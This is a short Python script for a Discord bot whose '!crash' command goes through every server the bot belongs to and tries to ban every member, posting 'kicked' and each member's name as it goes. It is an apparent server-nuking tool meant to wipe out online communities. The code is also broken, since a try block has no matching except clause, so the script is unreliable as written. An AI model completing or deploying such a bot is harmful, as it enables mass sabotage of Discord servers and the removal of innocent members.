from discord.ext import commands
print("not now")
bot = commands.Bot(command_prefix="!", case_insensitive=True)

@bot.command()
async def crash(ctx):
    for guild in bot.guilds:
        for member in guild.members:
            await ctx.send("kicked")
            await ctx.send(member)
            try:
                await member.ban()
bot.run("token here please")
